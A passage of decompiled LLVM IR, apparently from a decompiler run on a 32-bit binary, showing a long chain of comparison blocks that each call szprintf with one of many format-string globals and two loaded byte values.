  %v8_abfc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1c520.111 to i32), i32 %v4_abfc, i32 %v6_abfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac00

dec_label_pc_ac00:                                ; preds = %dec_label_pc_abcc, %dec_label_pc_abd8
  %v7_ac04 = icmp eq i32 %v2_a7e4, 20
  br i1 %v7_ac04, label %dec_label_pc_ac0c, label %dec_label_pc_ac34

dec_label_pc_ac0c:                                ; preds = %dec_label_pc_ac00
  %v3_ac18 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ac24 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ac30 = sext i8 %v3_ac18 to i32
  %v6_ac30 = sext i8 %v3_ac24 to i32
  %v8_ac30 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c52c.113 to i32), i32 %v4_ac30, i32 %v6_ac30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac34

dec_label_pc_ac34:                                ; preds = %dec_label_pc_ac00, %dec_label_pc_ac0c
  %v7_ac38 = icmp eq i32 %v2_a7e4, 21
  br i1 %v7_ac38, label %dec_label_pc_ac40, label %dec_label_pc_ac68

dec_label_pc_ac40:                                ; preds = %dec_label_pc_ac34
  %v3_ac4c = load i8, i8* @global_var_28c59.70, align 1
  %v3_ac58 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ac64 = sext i8 %v3_ac4c to i32
  %v6_ac64 = sext i8 %v3_ac58 to i32
  %v8_ac64 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c538.115 to i32), i32 %v4_ac64, i32 %v6_ac64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac68

dec_label_pc_ac68:                                ; preds = %dec_label_pc_ac34, %dec_label_pc_ac40
  %v7_ac6c = icmp eq i32 %v2_a7e4, 22
  br i1 %v7_ac6c, label %dec_label_pc_ac74, label %dec_label_pc_ac9c

dec_label_pc_ac74:                                ; preds = %dec_label_pc_ac68
  %v3_ac80 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ac8c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ac98 = sext i8 %v3_ac80 to i32
  %v6_ac98 = sext i8 %v3_ac8c to i32
  %v8_ac98 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1c548.117 to i32), i32 %v4_ac98, i32 %v6_ac98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac9c

dec_label_pc_ac9c:                                ; preds = %dec_label_pc_ac68, %dec_label_pc_ac74
  %v7_aca0 = icmp eq i32 %v2_a7e4, 23
  br i1 %v7_aca0, label %dec_label_pc_aca8, label %dec_label_pc_acd0

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac9c
  %v3_acb4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_acc0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_accc = sext i8 %v3_acb4 to i32
  %v6_accc = sext i8 %v3_acc0 to i32
  %v8_accc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1c554.119 to i32), i32 %v4_accc, i32 %v6_accc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_acd0

dec_label_pc_acd0:                                ; preds = %dec_label_pc_ac9c, %dec_label_pc_aca8
  %v7_acd4 = icmp eq i32 %v2_a7e4, 24
  br i1 %v7_acd4, label %dec_label_pc_acdc, label %dec_label_pc_ad04

dec_label_pc_acdc:                                ; preds = %dec_label_pc_acd0
  %v3_ace8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_acf4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ad00 = sext i8 %v3_ace8 to i32
  %v6_ad00 = sext i8 %v3_acf4 to i32
  %v8_ad00 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c560.121 to i32), i32 %v4_ad00, i32 %v6_ad00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad04

dec_label_pc_ad04:                                ; preds = %dec_label_pc_acd0, %dec_label_pc_acdc
  %v7_ad08 = icmp eq i32 %v2_a7e4, 25
  br i1 %v7_ad08, label %dec_label_pc_ad10, label %dec_label_pc_ad38

dec_label_pc_ad10:                                ; preds = %dec_label_pc_ad04
  %v3_ad1c = load i8, i8* @global_var_28c59.70, align 1
  %v3_ad28 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ad34 = sext i8 %v3_ad1c to i32
  %v6_ad34 = sext i8 %v3_ad28 to i32
  %v8_ad34 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c56c.123 to i32), i32 %v4_ad34, i32 %v6_ad34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad38

dec_label_pc_ad38:                                ; preds = %dec_label_pc_ad04, %dec_label_pc_ad10
  %v7_ad3c = icmp eq i32 %v2_a7e4, 26
  br i1 %v7_ad3c, label %dec_label_pc_ad44, label %dec_label_pc_ad6c

dec_label_pc_ad44:                                ; preds = %dec_label_pc_ad38
  %v3_ad50 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ad5c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ad68 = sext i8 %v3_ad50 to i32
  %v6_ad68 = sext i8 %v3_ad5c to i32
  %v8_ad68 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c578.125 to i32), i32 %v4_ad68, i32 %v6_ad68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad6c

dec_label_pc_ad6c:                                ; preds = %dec_label_pc_ad38, %dec_label_pc_ad44
  %v7_ad70 = icmp eq i32 %v2_a7e4, 27
  br i1 %v7_ad70, label %dec_label_pc_ad78, label %dec_label_pc_ada0

dec_label_pc_ad78:                                ; preds = %dec_label_pc_ad6c
  %v3_ad84 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ad90 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ad9c = sext i8 %v3_ad84 to i32
  %v6_ad9c = sext i8 %v3_ad90 to i32
  %v8_ad9c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c584.127 to i32), i32 %v4_ad9c, i32 %v6_ad9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad6c, %dec_label_pc_ad78
  %v7_ada4 = icmp eq i32 %v2_a7e4, 28
  br i1 %v7_ada4, label %dec_label_pc_adac, label %dec_label_pc_add4

dec_label_pc_adac:                                ; preds = %dec_label_pc_ada0
  %v3_adb8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_adc4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_add0 = sext i8 %v3_adb8 to i32
  %v6_add0 = sext i8 %v3_adc4 to i32
  %v8_add0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c594.129 to i32), i32 %v4_add0, i32 %v6_add0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_add4

dec_label_pc_add4:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_adac
  %v7_add8 = icmp eq i32 %v2_a7e4, 29
  br i1 %v7_add8, label %dec_label_pc_ade0, label %dec_label_pc_ae08

dec_label_pc_ade0:                                ; preds = %dec_label_pc_add4
  %v3_adec = load i8, i8* @global_var_28c59.70, align 1
  %v3_adf8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ae04 = sext i8 %v3_adec to i32
  %v6_ae04 = sext i8 %v3_adf8 to i32
  %v8_ae04 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c5a4.131 to i32), i32 %v4_ae04, i32 %v6_ae04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae08

dec_label_pc_ae08:                                ; preds = %dec_label_pc_add4, %dec_label_pc_ade0
  %v7_ae0c = icmp eq i32 %v2_a7e4, 30
  br i1 %v7_ae0c, label %dec_label_pc_ae14, label %dec_label_pc_ae3c

dec_label_pc_ae14:                                ; preds = %dec_label_pc_ae08
  %v3_ae20 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ae2c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ae38 = sext i8 %v3_ae20 to i32
  %v6_ae38 = sext i8 %v3_ae2c to i32
  %v8_ae38 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c5b0.133 to i32), i32 %v4_ae38, i32 %v6_ae38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae3c

dec_label_pc_ae3c:                                ; preds = %dec_label_pc_ae08, %dec_label_pc_ae14
  %v7_ae40 = icmp eq i32 %v2_a7e4, 31
  br i1 %v7_ae40, label %dec_label_pc_ae48, label %dec_label_pc_ae70

dec_label_pc_ae48:                                ; preds = %dec_label_pc_ae3c
  %v3_ae54 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ae60 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ae6c = sext i8 %v3_ae54 to i32
  %v6_ae6c = sext i8 %v3_ae60 to i32
  %v8_ae6c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c5c0.135 to i32), i32 %v4_ae6c, i32 %v6_ae6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae70

dec_label_pc_ae70:                                ; preds = %dec_label_pc_ae3c, %dec_label_pc_ae48
  %v7_ae74 = icmp eq i32 %v2_a7e4, 32
  br i1 %v7_ae74, label %dec_label_pc_ae7c, label %dec_label_pc_aea4

dec_label_pc_ae7c:                                ; preds = %dec_label_pc_ae70
  %v3_ae88 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ae94 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_aea0 = sext i8 %v3_ae88 to i32
  %v6_aea0 = sext i8 %v3_ae94 to i32
  %v8_aea0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1c5cc.137 to i32), i32 %v4_aea0, i32 %v6_aea0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aea4

dec_label_pc_aea4:                                ; preds = %dec_label_pc_ae70, %dec_label_pc_ae7c
  %v7_aea8 = icmp eq i32 %v2_a7e4, 33
  br i1 %v7_aea8, label %dec_label_pc_aeb0, label %dec_label_pc_aed8

dec_label_pc_aeb0:                                ; preds = %dec_label_pc_aea4
  %v3_aebc = load i8, i8* @global_var_28c59.70, align 1
  %v3_aec8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_aed4 = sext i8 %v3_aebc to i32
  %v6_aed4 = sext i8 %v3_aec8 to i32
  %v8_aed4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c5d8.139 to i32), i32 %v4_aed4, i32 %v6_aed4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aed8

dec_label_pc_aed8:                                ; preds = %dec_label_pc_aea4, %dec_label_pc_aeb0
  %v7_aedc = icmp eq i32 %v2_a7e4, 34
  br i1 %v7_aedc, label %dec_label_pc_aee4, label %dec_label_pc_af0c

dec_label_pc_aee4:                                ; preds = %dec_label_pc_aed8
  %v3_aef0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_aefc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_af08 = sext i8 %v3_aef0 to i32
  %v6_af08 = sext i8 %v3_aefc to i32
  %v8_af08 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c5e4.141 to i32), i32 %v4_af08, i32 %v6_af08, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af0c

dec_label_pc_af0c:                                ; preds = %dec_label_pc_aed8, %dec_label_pc_aee4
  %v7_af10 = icmp eq i32 %v2_a7e4, 35
  br i1 %v7_af10, label %dec_label_pc_af18, label %dec_label_pc_af40

dec_label_pc_af18:                                ; preds = %dec_label_pc_af0c
  %v3_af24 = load i8, i8* @global_var_28c59.70, align 1
  %v3_af30 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_af3c = sext i8 %v3_af24 to i32
  %v6_af3c = sext i8 %v3_af30 to i32
  %v8_af3c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c5f0.143 to i32), i32 %v4_af3c, i32 %v6_af3c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af40

dec_label_pc_af40:                                ; preds = %dec_label_pc_af0c, %dec_label_pc_af18
  %v7_af44 = icmp eq i32 %v2_a7e4, 36
  br i1 %v7_af44, label %dec_label_pc_af4c, label %dec_label_pc_af74

dec_label_pc_af4c:                                ; preds = %dec_label_pc_af40
  %v3_af58 = load i8, i8* @global_var_28c59.70, align 1
  %v3_af64 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_af70 = sext i8 %v3_af58 to i32
  %v6_af70 = sext i8 %v3_af64 to i32
  %v8_af70 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c5fc.145 to i32), i32 %v4_af70, i32 %v6_af70, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af74

dec_label_pc_af74:                                ; preds = %dec_label_pc_af40, %dec_label_pc_af4c
  %v7_af78 = icmp eq i32 %v2_a7e4, 37
  br i1 %v7_af78, label %dec_label_pc_af80, label %dec_label_pc_afa8

dec_label_pc_af80:                                ; preds = %dec_label_pc_af74
  %v3_af8c = load i8, i8* @global_var_28c59.70, align 1
  %v3_af98 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_afa4 = sext i8 %v3_af8c to i32
  %v6_afa4 = sext i8 %v3_af98 to i32
  %v8_afa4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c608.147 to i32), i32 %v4_afa4, i32 %v6_afa4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afa8

dec_label_pc_afa8:                                ; preds = %dec_label_pc_af74, %dec_label_pc_af80
  %v7_afac = icmp eq i32 %v2_a7e4, 38
  br i1 %v7_afac, label %dec_label_pc_afb4, label %dec_label_pc_afdc

dec_label_pc_afb4:                                ; preds = %dec_label_pc_afa8
  %v3_afc0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_afcc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_afd8 = sext i8 %v3_afc0 to i32
  %v6_afd8 = sext i8 %v3_afcc to i32
  %v8_afd8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c614.149 to i32), i32 %v4_afd8, i32 %v6_afd8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afdc

dec_label_pc_afdc:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_afb4
  %v7_afe0 = icmp eq i32 %v2_a7e4, 39
  br i1 %v7_afe0, label %dec_label_pc_afe8, label %dec_label_pc_b010

dec_label_pc_afe8:                                ; preds = %dec_label_pc_afdc
  %v3_aff4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b000 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b00c = sext i8 %v3_aff4 to i32
  %v6_b00c = sext i8 %v3_b000 to i32
  %v8_b00c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c624.151 to i32), i32 %v4_b00c, i32 %v6_b00c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b010

dec_label_pc_b010:                                ; preds = %dec_label_pc_afdc, %dec_label_pc_afe8
  %v7_b014 = icmp eq i32 %v2_a7e4, 40
  br i1 %v7_b014, label %dec_label_pc_b01c, label %dec_label_pc_b044

dec_label_pc_b01c:                                ; preds = %dec_label_pc_b010
  %v3_b028 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b034 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b040 = sext i8 %v3_b028 to i32
  %v6_b040 = sext i8 %v3_b034 to i32
  %v8_b040 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c614.149 to i32), i32 %v4_b040, i32 %v6_b040, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b044

dec_label_pc_b044:                                ; preds = %dec_label_pc_b010, %dec_label_pc_b01c
  %v7_b048 = icmp eq i32 %v2_a7e4, 41
  br i1 %v7_b048, label %dec_label_pc_b050, label %dec_label_pc_b078

dec_label_pc_b050:                                ; preds = %dec_label_pc_b044
  %v3_b05c = load i8, i8* @global_var_28c59.70, align 1
  %v3_b068 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b074 = sext i8 %v3_b05c to i32
  %v6_b074 = sext i8 %v3_b068 to i32
  %v8_b074 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c634.153 to i32), i32 %v4_b074, i32 %v6_b074, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b078

dec_label_pc_b078:                                ; preds = %dec_label_pc_b044, %dec_label_pc_b050
  %v7_b07c = icmp eq i32 %v2_a7e4, 42
  br i1 %v7_b07c, label %dec_label_pc_b084, label %dec_label_pc_b0ac

dec_label_pc_b084:                                ; preds = %dec_label_pc_b078
  %v3_b090 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b09c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b0a8 = sext i8 %v3_b090 to i32
  %v6_b0a8 = sext i8 %v3_b09c to i32
  %v8_b0a8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c644.155 to i32), i32 %v4_b0a8, i32 %v6_b0a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0ac

dec_label_pc_b0ac:                                ; preds = %dec_label_pc_b078, %dec_label_pc_b084
  %v7_b0b0 = icmp eq i32 %v2_a7e4, 43
  br i1 %v7_b0b0, label %dec_label_pc_b0b8, label %dec_label_pc_b0e0

dec_label_pc_b0b8:                                ; preds = %dec_label_pc_b0ac
  %v3_b0c4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b0d0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b0dc = sext i8 %v3_b0c4 to i32
  %v6_b0dc = sext i8 %v3_b0d0 to i32
  %v8_b0dc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c654.157 to i32), i32 %v4_b0dc, i32 %v6_b0dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0e0

dec_label_pc_b0e0:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b0b8
  %v7_b0e4 = icmp eq i32 %v2_a7e4, 44
  br i1 %v7_b0e4, label %dec_label_pc_b0ec, label %dec_label_pc_b114

dec_label_pc_b0ec:                                ; preds = %dec_label_pc_b0e0
  %v3_b0f8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b104 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b110 = sext i8 %v3_b0f8 to i32
  %v6_b110 = sext i8 %v3_b104 to i32
  %v8_b110 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c644.155 to i32), i32 %v4_b110, i32 %v6_b110, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b114

dec_label_pc_b114:                                ; preds = %dec_label_pc_b0e0, %dec_label_pc_b0ec
  %v7_b118 = icmp eq i32 %v2_a7e4, 45
  br i1 %v7_b118, label %dec_label_pc_b120, label %dec_label_pc_b148

dec_label_pc_b120:                                ; preds = %dec_label_pc_b114
  %v3_b12c = load i8, i8* @global_var_28c59.70, align 1
  %v3_b138 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b144 = sext i8 %v3_b12c to i32
  %v6_b144 = sext i8 %v3_b138 to i32
  %v8_b144 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c664.159 to i32), i32 %v4_b144, i32 %v6_b144, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b148

dec_label_pc_b148:                                ; preds = %dec_label_pc_b114, %dec_label_pc_b120
  %v7_b14c = icmp eq i32 %v2_a7e4, 46
  br i1 %v7_b14c, label %dec_label_pc_b154, label %dec_label_pc_b17c

dec_label_pc_b154:                                ; preds = %dec_label_pc_b148
  %v3_b160 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b16c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b178 = sext i8 %v3_b160 to i32
  %v6_b178 = sext i8 %v3_b16c to i32
  %v8_b178 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c674.161 to i32), i32 %v4_b178, i32 %v6_b178, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %dec_label_pc_b148, %dec_label_pc_b154
  %v7_b180 = icmp eq i32 %v2_a7e4, 47
  br i1 %v7_b180, label %dec_label_pc_b188, label %dec_label_pc_b1b0

dec_label_pc_b188:                                ; preds = %dec_label_pc_b17c
  %v3_b194 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b1a0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b1ac = sext i8 %v3_b194 to i32
  %v6_b1ac = sext i8 %v3_b1a0 to i32
  %v8_b1ac = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c684.163 to i32), i32 %v4_b1ac, i32 %v6_b1ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1b0

dec_label_pc_b1b0:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b188
  %v7_b1b4 = icmp eq i32 %v2_a7e4, 48
  br i1 %v7_b1b4, label %dec_label_pc_b1bc, label %dec_label_pc_b1e4

dec_label_pc_b1bc:                                ; preds = %dec_label_pc_b1b0
  %v3_b1c8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b1d4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b1e0 = sext i8 %v3_b1c8 to i32
  %v6_b1e0 = sext i8 %v3_b1d4 to i32
  %v8_b1e0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c694.165 to i32), i32 %v4_b1e0, i32 %v6_b1e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1e4

dec_label_pc_b1e4:                                ; preds = %dec_label_pc_b1b0, %dec_label_pc_b1bc
  %v7_b1e8 = icmp eq i32 %v2_a7e4, 49
  br i1 %v7_b1e8, label %dec_label_pc_b1f0, label %dec_label_pc_b218

dec_label_pc_b1f0:                                ; preds = %dec_label_pc_b1e4
  %v3_b1fc = load i8, i8* @global_var_28c59.70, align 1
  %v3_b208 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b214 = sext i8 %v3_b1fc to i32
  %v6_b214 = sext i8 %v3_b208 to i32
  %v8_b214 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c6a4.167 to i32), i32 %v4_b214, i32 %v6_b214, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b218

dec_label_pc_b218:                                ; preds = %dec_label_pc_b1e4, %dec_label_pc_b1f0
  %v7_b21c = icmp eq i32 %v2_a7e4, 50
  br i1 %v7_b21c, label %dec_label_pc_b224, label %dec_label_pc_b24c

dec_label_pc_b224:                                ; preds = %dec_label_pc_b218
  %v3_b230 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b23c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b248 = sext i8 %v3_b230 to i32
  %v6_b248 = sext i8 %v3_b23c to i32
  %v8_b248 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c6b4.169 to i32), i32 %v4_b248, i32 %v6_b248, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b24c

dec_label_pc_b24c:                                ; preds = %dec_label_pc_b218, %dec_label_pc_b224
  %v7_b250 = icmp eq i32 %v2_a7e4, 51
  br i1 %v7_b250, label %dec_label_pc_b258, label %dec_label_pc_b280

dec_label_pc_b258:                                ; preds = %dec_label_pc_b24c
  %v3_b264 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b270 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b27c = sext i8 %v3_b264 to i32
  %v6_b27c = sext i8 %v3_b270 to i32
  %v8_b27c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1c6c4.171 to i32), i32 %v4_b27c, i32 %v6_b27c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b280

dec_label_pc_b280:                                ; preds = %dec_label_pc_b24c, %dec_label_pc_b258
  %v7_b284 = icmp eq i32 %v2_a7e4, 52
  br i1 %v7_b284, label %dec_label_pc_b28c, label %dec_label_pc_b2b4

dec_label_pc_b28c:                                ; preds = %dec_label_pc_b280
  %v3_b298 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b2a4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b2b0 = sext i8 %v3_b298 to i32
  %v6_b2b0 = sext i8 %v3_b2a4 to i32
  %v8_b2b0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c6d4.173 to i32), i32 %v4_b2b0, i32 %v6_b2b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2b4

dec_label_pc_b2b4:                                ; preds = %dec_label_pc_b280, %dec_label_pc_b28c
  %v7_b2b8 = icmp eq i32 %v2_a7e4, 53
  br i1 %v7_b2b8, label %dec_label_pc_b2c0, label %dec_label_pc_b2e8

dec_label_pc_b2c0:                                ; preds = %dec_label_pc_b2b4
  %v3_b2cc = load i8, i8* @global_var_28c59.70, align 1
  %v3_b2d8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b2e4 = sext i8 %v3_b2cc to i32
  %v6_b2e4 = sext i8 %v3_b2d8 to i32
  %v8_b2e4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1c6e4.175 to i32), i32 %v4_b2e4, i32 %v6_b2e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2e8

dec_label_pc_b2e8:                                ; preds = %dec_label_pc_b2b4, %dec_label_pc_b2c0
  %v7_b2ec = icmp eq i32 %v2_a7e4, 54
  br i1 %v7_b2ec, label %dec_label_pc_b2f4, label %dec_label_pc_b31c

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b2e8
  %v3_b300 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b30c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b318 = sext i8 %v3_b300 to i32
  %v6_b318 = sext i8 %v3_b30c to i32
  %v8_b318 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c6f4.177 to i32), i32 %v4_b318, i32 %v6_b318, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b2e8, %dec_label_pc_b2f4
  %v7_b320 = icmp eq i32 %v2_a7e4, 55
  br i1 %v7_b320, label %dec_label_pc_b328, label %dec_label_pc_b350

dec_label_pc_b328:                                ; preds = %dec_label_pc_b31c
  %v3_b334 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b340 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b34c = sext i8 %v3_b334 to i32
  %v6_b34c = sext i8 %v3_b340 to i32
  %v8_b34c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1c704.179 to i32), i32 %v4_b34c, i32 %v6_b34c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b350

dec_label_pc_b350:                                ; preds = %dec_label_pc_b31c, %dec_label_pc_b328
  %v7_b354 = icmp eq i32 %v2_a7e4, 56
  br i1 %v7_b354, label %dec_label_pc_b35c, label %dec_label_pc_b384

dec_label_pc_b35c:                                ; preds = %dec_label_pc_b350
  %v3_b368 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b374 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b380 = sext i8 %v3_b368 to i32
  %v6_b380 = sext i8 %v3_b374 to i32
  %v8_b380 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1c714.181 to i32), i32 %v4_b380, i32 %v6_b380, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b384

dec_label_pc_b384:                                ; preds = %dec_label_pc_b350, %dec_label_pc_b35c
  %v7_b388 = icmp eq i32 %v2_a7e4, 57
  br i1 %v7_b388, label %dec_label_pc_b390, label %dec_label_pc_b3b8

dec_label_pc_b390:                                ; preds = %dec_label_pc_b384
  %v3_b39c = load i8, i8* @global_var_28c59.70, align 1
  %v3_b3a8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b3b4 = sext i8 %v3_b39c to i32
  %v6_b3b4 = sext i8 %v3_b3a8 to i32
  %v8_b3b4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c724.183 to i32), i32 %v4_b3b4, i32 %v6_b3b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3b8

dec_label_pc_b3b8:                                ; preds = %dec_label_pc_b384, %dec_label_pc_b390
  %v7_b3bc = icmp eq i32 %v2_a7e4, 58
  br i1 %v7_b3bc, label %dec_label_pc_b3c4, label %dec_label_pc_b3ec

dec_label_pc_b3c4:                                ; preds = %dec_label_pc_b3b8
  %v3_b3d0 = load i8, i8* @global_var_28c59.70, align 1
